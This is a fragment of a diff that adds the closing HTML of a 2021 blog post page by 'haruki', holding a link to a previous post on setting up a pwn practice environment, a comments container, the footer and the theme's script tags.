+                <a href="/2021/10/04/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="prev" title="pwn入门之环境搭建">
+                  <i class="fa fa-chevron-left"></i> pwn入门之环境搭建
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments" id="lv-container" data-id="city" data-uid="MTAyMC81NDQxMC8zMDg4MQ=="></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">haruki</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+<script src="/js/third-party/comments/livere.js"></script>
+
+</body>
+</html>
